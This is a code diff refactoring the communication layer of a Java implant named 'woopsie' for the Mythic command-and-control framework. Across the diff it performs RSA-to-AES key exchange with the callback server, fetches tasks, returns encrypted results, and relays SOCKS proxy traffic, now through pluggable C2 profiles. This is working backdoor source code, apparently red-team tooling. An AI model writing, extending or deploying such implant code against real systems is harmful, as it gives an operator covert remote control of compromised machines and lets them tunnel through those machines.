@@ -1,15 +1,9 @@
 package com.woopsie;
 
+import com.woopsie.profiles.C2Profile;
+import com.woopsie.profiles.ProfileFactory;
 import com.woopsie.utils.EncryptionUtils;
 import com.woopsie.utils.SystemInfo;
-import org.apache.hc.client5.http.classic.methods.HttpGet;
-import org.apache.hc.client5.http.classic.methods.HttpPost;
-import org.apache.hc.client5.http.impl.classic.CloseableHttpClient;
-import org.apache.hc.client5.http.impl.classic.CloseableHttpResponse;
-import org.apache.hc.client5.http.impl.classic.HttpClients;
-import org.apache.hc.core5.http.io.entity.StringEntity;
-import org.apache.hc.core5.http.io.entity.EntityUtils;
-import org.apache.hc.core5.http.ParseException;
 import com.fasterxml.jackson.databind.ObjectMapper;
 import com.fasterxml.jackson.databind.JsonNode;
 
@@ -26,21 +20,22 @@ import javax.crypto.spec.PSource;
 import java.util.*;
 
 /**
- * Handles communication with Mythic C2 server
+ * Handles communication with Mythic C2 server using pluggable profiles
  */
 public class CommunicationHandler {
     private final Config config;
-    private final CloseableHttpClient httpClient;
+    private final C2Profile profile;
     private final ObjectMapper objectMapper;
     private String callbackUuid;
-    private byte[] aesKey;
     
-    public CommunicationHandler(Config config) {
+    public CommunicationHandler(Config config) throws Exception {
         this.config = config;
-        this.httpClient = HttpClients.createDefault();
         this.objectMapper = new ObjectMapper();
         this.callbackUuid = null;
-        this.aesKey = null;
+        
+        // Create profile based on configuration
+        this.profile = ProfileFactory.createProfile(config);
+        Config.debugLog(config, "Initialized C2 profile: " + profile.getProfileName());
         
         // Check for AESPSK (pre-shared AES key) and use it if present
         parseAESPSK();
@@ -52,7 +47,8 @@ public class CommunicationHandler {
             try {
                 JsonNode aespsk = objectMapper.readTree(aespskJson);
                 String encKeyB64 = aespsk.get("enc_key").asText();
-                this.aesKey = Base64.getDecoder().decode(encKeyB64);
+                byte[] aesKey = Base64.getDecoder().decode(encKeyB64);
+                profile.setAesKey(aesKey);
                 this.callbackUuid = config.getUuid();
                 Config.debugLog(config, "AESPSK detected - using pre-shared AES key (no RSA exchange)");
             } catch (Exception e) {
@@ -63,7 +59,7 @@ public class CommunicationHandler {
     
     public void checkin() throws Exception {
         // Perform key exchange if enabled and no pre-shared key
-        if (config.isEncryptedExchangeCheck() && aesKey == null) {
+        if (config.isEncryptedExchangeCheck() && profile.getAesKey() == null) {
             Config.debugLog(config, "Encrypted exchange check enabled - performing RSA key exchange");
             performKeyExchange();
             
@@ -109,7 +105,11 @@ public class CommunicationHandler {
         Config.debugLog(config, "=== CHECKIN COMPLETE ===");
     }
     
-    public String[] getTasks() throws Exception {
+    /**
+     * Get tasks and SOCKS messages from C2
+     * Returns a map with "tasks" (String[]) and "socks" (List<Map>) if present
+     */
+    public Map<String, Object> getTaskingResponse() throws Exception {
         if (callbackUuid == null) {
             throw new IOException("Not checked in - no callback UUID");
         }
@@ -131,6 +131,8 @@ public class CommunicationHandler {
         // Parse response
         JsonNode responseJson = objectMapper.readTree(response);
         
+        Map<String, Object> result = new HashMap<>();
+        
         // Extract tasks array
         if (responseJson.has("tasks")) {
             JsonNode tasksNode = responseJson.get("tasks");
@@ -139,11 +141,34 @@ public class CommunicationHandler {
                 tasks.add(task.toString());
             }
             Config.debugLog(config, "Received " + tasks.size() + " task(s)");
-            return tasks.toArray(new String[0]);
+            result.put("tasks", tasks.toArray(new String[0]));
+        } else {
+            Config.debugLog(config, "No tasks in response");
+            result.put("tasks", new String[0]);
         }
         
-        Config.debugLog(config, "No tasks in response");
-        return new String[0];
+        // Extract socks array if present
+        if (responseJson.has("socks")) {
+            JsonNode socksNode = responseJson.get("socks");
+            List<Map<String, Object>> socksList = new ArrayList<>();
+            if (socksNode.isArray()) {
+                for (JsonNode socksMsg : socksNode) {
+                    socksList.add(objectMapper.convertValue(socksMsg, Map.class));
+                }
+            }
+            Config.debugLog(config, "Received " + socksList.size() + " SOCKS message(s)");
+            result.put("socks", socksList);
+        }
+        
+        return result;
+    }
+    
+    /**
+     * Legacy method - kept for backward compatibility
+     */
+    public String[] getTasks() throws Exception {
+        Map<String, Object> response = getTaskingResponse();
+        return (String[]) response.get("tasks");
     }
     
     /**
@@ -157,10 +182,54 @@ public class CommunicationHandler {
         Config.debugLog(config, "=== SENDING TASK RESULTS ===");
         Config.debugLog(config, "Number of results: " + taskResults.size());
         
+        // Separate regular responses from SOCKS messages (like oopsie does)
+        List<Map<String, Object>> regularResponses = new ArrayList<>();
+        List<Map<String, Object>> socksMessages = new ArrayList<>();
+        
+        for (Map<String, Object> result : taskResults) {
+            Config.debugLog(config, "Processing result: " + result);
+            Config.debugLog(config, "Contains 'socks' key: " + result.containsKey("socks"));
+            
+            if (result.containsKey("socks")) {
+                // Extract SOCKS messages from this response
+                Object socksField = result.get("socks");
+                Config.debugLog(config, "SOCKS field type: " + (socksField != null ? socksField.getClass().getName() : "null"));
+                
+                if (socksField instanceof List) {
+                    @SuppressWarnings("unchecked")
+                    List<Map<String, Object>> socksList = (List<Map<String, Object>>) socksField;
+                    socksMessages.addAll(socksList);
+                    Config.debugLog(config, "Added " + socksList.size() + " SOCKS message(s)");
+                } else if (socksField instanceof Object[]) {
+                    // Handle array case
+                    Object[] socksArray = (Object[]) socksField;
+                    for (Object obj : socksArray) {
+                        if (obj instanceof Map) {
+                            @SuppressWarnings("unchecked")
+                            Map<String, Object> socksMsg = (Map<String, Object>) obj;
+                            socksMessages.add(socksMsg);
+                        }
+                    }
+                    Config.debugLog(config, "Added " + socksArray.length + " SOCKS message(s) from array");
+                } else {
+                    Config.debugLog(config, "SOCKS field is not a List or array!");
+                }
+            } else {
+                // Regular task response
+                regularResponses.add(result);
+            }
+        }
+        
         // Build post_response message
         Map<String, Object> postResponse = new HashMap<>();
         postResponse.put("action", "post_response");
-        postResponse.put("responses", taskResults);
+        postResponse.put("responses", regularResponses);
+        
+        // Add SOCKS messages at top level if any exist (matches oopsie structure)
+        if (!socksMessages.isEmpty()) {
+            postResponse.put("socks", socksMessages);
+            Config.debugLog(config, "Extracted " + socksMessages.size() + " SOCKS message(s) to top-level field");
+        }
         
         String jsonBody = objectMapper.writeValueAsString(postResponse);
         Config.debugLog(config, "Task results JSON: " + jsonBody);
@@ -169,7 +238,7 @@ public class CommunicationHandler {
         String response = sendData(jsonBody);
         Config.debugLog(config, "Post response result: " + response);
         
-        // Parse response to check for background task responses (file_id, etc.)
+        // Parse response to check for background task responses (file_id, socks, etc.)
         List<Map<String, Object>> backgroundTasks = new ArrayList<>();
         try {
             JsonNode responseNode = objectMapper.readTree(response);
@@ -178,10 +247,10 @@ public class CommunicationHandler {
                     // Convert to map for easier handling
                     Map<String, Object> respMap = objectMapper.convertValue(resp, Map.class);
                     
-                    // Only route to background tasks if it contains file_id (actual background task data)
-                    // Simple acknowledgments with just task_id and status should be ignored
-                    if (respMap.containsKey("file_id")) {
-                        Config.debugLog(config, "Received background task response with file_id: " + resp);
+                    // Route to background tasks if it contains file_id (upload/download data)
+                    // or socks field (SOCKS messages)
+                    if (respMap.containsKey("file_id") || respMap.containsKey("socks")) {
+                        Config.debugLog(config, "Received background task response: " + resp);
                         backgroundTasks.add(respMap);
                     }
                 }
@@ -348,59 +417,47 @@ public class CommunicationHandler {
         String payload = config.getUuid() + jsonBody;
         String encodedPayload = Base64.getEncoder().encodeToString(payload.getBytes());
         
-        String targetUrl = config.getCallbackUrl() + config.getPostUri();
-        Config.debugLog(config, "Key exchange URL: " + targetUrl);
-        Config.debugLog(config, "Sending staging_rsa as Base64(UUID + JSON)");
+        Config.debugLog(config, "Sending staging_rsa via profile");
         
-        HttpPost post = new HttpPost(targetUrl);
-        post.setHeader("User-Agent", config.getUserAgent());
-        post.setHeader("Content-Type", "application/json");
-        post.setEntity(new StringEntity(encodedPayload));
+        // Send via profile
+        String responseBody = profile.send(encodedPayload);
+        byte[] decoded = Base64.getDecoder().decode(responseBody);
+        String jsonResponse = new String(decoded, 36, decoded.length - 36);
         
-        try (CloseableHttpResponse response = httpClient.execute(post)) {
-            int statusCode = response.getCode();
-            Config.debugLog(config, "Key exchange response status: " + statusCode);
-            
-            if (statusCode != 200) {
-                throw new IOException("Key exchange failed with status: " + statusCode);
-            }
-            
-            // Parse response
-            String responseBody = EntityUtils.toString(response.getEntity());
-            byte[] decoded = Base64.getDecoder().decode(responseBody);
-            String jsonResponse = new String(decoded, 36, decoded.length - 36);
-            
-            Config.debugLog(config, "Key exchange response: " + jsonResponse);
-            
-            JsonNode responseJson = objectMapper.readTree(jsonResponse);
-            
-            // Get encrypted session key and callback UUID
-            String encryptedSessionKey = responseJson.get("session_key").asText();
-            this.callbackUuid = responseJson.get("uuid").asText();
-            
-            Config.debugLog(config, "Received callback UUID: " + this.callbackUuid);
-            Config.debugLog(config, "Encrypted session key length: " + encryptedSessionKey.length() + " chars");
-            
-            // Decrypt AES session key using RSA private key
-            byte[] encryptedKeyBytes = Base64.getDecoder().decode(encryptedSessionKey);
-            
-            Cipher rsaCipher = Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding");
-            OAEPParameterSpec oaepParams = new OAEPParameterSpec("SHA-256", "MGF1", 
-                MGF1ParameterSpec.SHA256, PSource.PSpecified.DEFAULT);
-            rsaCipher.init(Cipher.DECRYPT_MODE, keyPair.getPrivate(), oaepParams);
-            
-            byte[] decryptedKey = rsaCipher.doFinal(encryptedKeyBytes);
-            
-            // AES key should be 32 bytes (256 bits)
-            if (decryptedKey.length > 32) {
-                this.aesKey = Arrays.copyOf(decryptedKey, 32);
-            } else {
-                this.aesKey = decryptedKey;
-            }
-            
-            Config.debugLog(config, "Successfully decrypted AES session key (" + this.aesKey.length + " bytes)");
-            Config.debugLog(config, "=== KEY EXCHANGE COMPLETE ===");
+        Config.debugLog(config, "Key exchange response: " + jsonResponse);
+        
+        JsonNode responseJson = objectMapper.readTree(jsonResponse);
+        
+        // Get encrypted session key and callback UUID
+        String encryptedSessionKey = responseJson.get("session_key").asText();
+        this.callbackUuid = responseJson.get("uuid").asText();
+        
+        Config.debugLog(config, "Received callback UUID: " + this.callbackUuid);
+        Config.debugLog(config, "Encrypted session key length: " + encryptedSessionKey.length() + " chars");
+        
+        // Decrypt AES session key using RSA private key
+        byte[] encryptedKeyBytes = Base64.getDecoder().decode(encryptedSessionKey);
+        
+        Cipher rsaCipher = Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding");
+        OAEPParameterSpec oaepParams = new OAEPParameterSpec("SHA-256", "MGF1", 
+            MGF1ParameterSpec.SHA256, PSource.PSpecified.DEFAULT);
+        rsaCipher.init(Cipher.DECRYPT_MODE, keyPair.getPrivate(), oaepParams);
+        
+        byte[] decryptedKey = rsaCipher.doFinal(encryptedKeyBytes);
+        
+        // AES key should be 32 bytes (256 bits)
+        byte[] finalAesKey;
+        if (decryptedKey.length > 32) {
+            finalAesKey = Arrays.copyOf(decryptedKey, 32);
+        } else {
+            finalAesKey = decryptedKey;
         }
+        
+        // Set the AES key in the profile
+        profile.setAesKey(finalAesKey);
+        
+        Config.debugLog(config, "Successfully decrypted AES session key (" + finalAesKey.length + " bytes)");
+        Config.debugLog(config, "=== KEY EXCHANGE COMPLETE ===");
     }
     
     /**
@@ -417,10 +474,11 @@ public class CommunicationHandler {
     }
     
     /**
-     * Send data with encryption if AES key is available
+     * Send data with encryption if AES key is available - uses configured profile
      */
     private String sendData(String jsonData) throws Exception {
         String encodedPayload;
+        byte[] aesKey = profile.getAesKey();
         
         if (aesKey != null && callbackUuid != null) {
             // Encrypt: UUID + IV + Ciphertext + HMAC
@@ -434,36 +492,18 @@ public class CommunicationHandler {
             encodedPayload = Base64.getEncoder().encodeToString(payload.getBytes());
         }
         
-        HttpPost post = new HttpPost(config.getCallbackUrl() + config.getPostUri());
-        post.setHeader("User-Agent", config.getUserAgent());
-        post.setHeader("Content-Type", "application/json");
-        post.setEntity(new StringEntity(encodedPayload));
+        // Send via profile (handles HTTP/HTTPX specifics)
+        String responseBody = profile.send(encodedPayload);
+        byte[] decoded = Base64.getDecoder().decode(responseBody);
         
-        try (CloseableHttpResponse response = httpClient.execute(post)) {
-            if (response.getCode() != 200) {
-                throw new IOException("Request failed with status: " + response.getCode());
-            }
-            
-            String responseBody = EntityUtils.toString(response.getEntity());
-            byte[] decoded = Base64.getDecoder().decode(responseBody);
-            
-            if (aesKey != null) {
-                // Decrypt response
-                Config.debugLog(config, "Decrypting response with AES-256");
-                byte[] decrypted = EncryptionUtils.decryptPayload(decoded, aesKey);
-                return new String(decrypted);
-            } else {
-                // No encryption: skip UUID prefix
-                return new String(decoded, 36, decoded.length - 36);
-            }
-        }
-    }
-    
-    public void close() {
-        try {
-            httpClient.close();
-        } catch (IOException e) {
-            // Silent close
+        if (aesKey != null) {
+            // Decrypt response
+            Config.debugLog(config, "Decrypting response with AES-256");
+            byte[] decrypted = EncryptionUtils.decryptPayload(decoded, aesKey);
+            return new String(decrypted);
+        } else {
+            // No encryption: skip UUID prefix
+            return new String(decoded, 36, decoded.length - 36);
         }
     }
 }
